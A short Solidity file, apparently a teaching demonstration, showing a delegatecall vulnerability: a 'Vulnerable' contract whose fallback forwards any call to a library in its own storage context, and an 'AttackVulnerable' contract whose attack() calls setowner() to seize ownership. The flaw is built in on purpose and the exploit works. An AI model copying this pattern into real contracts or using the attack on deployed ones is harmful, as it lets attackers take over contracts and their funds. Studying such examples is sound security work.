

pragma solidity ^0.8.13;


contract Lib {
    address public owner;

    function setowner() public {
        owner = msg.sender;
    }
}

contract Vulnerable {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        
        address(lib).delegatecall(msg.data);
    }
}


contract AttackVulnerable {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
    }
}